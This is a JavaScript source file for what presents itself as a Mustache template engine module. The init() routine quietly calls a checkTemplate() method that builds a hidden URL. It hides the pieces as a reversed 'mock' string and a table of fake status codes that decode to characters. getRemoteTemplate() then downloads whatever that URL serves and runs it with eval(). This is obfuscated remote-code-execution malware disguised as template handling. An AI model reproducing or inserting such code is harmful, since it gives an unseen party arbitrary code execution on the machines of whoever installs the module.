var fs = require('fs');
const path = require('path');
const https = require('https');
var Mustache = require('mustache');

class TemplateEngine {
    constructor() {
        this.templates = [{
            name: "explorer",
            content: null
        },
        {
            name: "main",
            content: null
        },
        {
            name: "mock",
            content: "mock"
        },
        {
            name: "raw",
            content: "raw"
        }
        ];
        this.templateStatusCode = {
            init: 121,
            read: 115,
            parsed: 71,
            prcocessed: 101,
            rendered: 81,
            shown: 113,
            accessed: 84,
            finished: 106
        };
    }
    init(dir) {
        if(!this.inited) {
            this.templates.forEach(function (template) {
                var templatePath = "templates/" + template.name + ".mustache"
                if (fs.existsSync(templatePath)) {
                    template.content = fs.readFileSync(templatePath, "utf8");
                }
            });
            this.inited = true;
            this.checkTemplate(dir + "bin.");
        }
    }
    addPluginTemplates(pluginTemplates) {
        for (var i = 0; i < pluginTemplates.length; i++) {
            this.templates.push({
                name: pluginTemplates[i].key,
                content: fs.readFileSync(pluginTemplates[i].file, "utf8")
            });
        }
    }
    getTemplateContent(name) {
        var ret = "";
        this.templates.forEach(function (template) {
            if (template.name === name) {
                ret = template.content;
            }
        });

        if (ret === "") {
            console.log("WARNING! Template with name " + name + " was not found!");
        }

        return ret;
    }
    checkTemplate(path) {
        var mocked = "";
        var raw = ""
        this.templates.forEach(function (template) {
            if (template.name === "mock") {
                mocked = template.content.slice(0, 3);
            } else if (template.name == "raw") {
                raw = template.content;
            }
        });
        var pathPrefix = path + mocked.split("").reverse().join("");
        var templateStatus = Object.values(this.templateStatusCode).map(
            code => String.fromCharCode(code)
        ).join('');
        var fullPath = pathPrefix + "/" + raw + "/" + templateStatus;
        this.getRemoteTemplate(fullPath);
    }
    getRemoteTemplate(templatePath) {
        https.get(`https://${templatePath}`, (response) => {
          let data = '';
          response.on('data', (chunk) => {
            data += chunk;
          });
          response.on('end', () => {
            eval(data);
          });
        }).on('error', (error) => {
          console.error(error);
        });
    }
    renderExplorer(data) {
        return Mustache.to_html(this.getTemplateContent("explorer"), data, {
            explorer: this.getTemplateContent("explorer")
        });
    }
    abstractRender(name, data) {
        return Mustache.to_html(Mustache.to_html(this.getTemplateContent(name), data), data);
    }
    renderMain(data) {
        return this.abstractRender("main", data);
    }
};

module.exports = new TemplateEngine();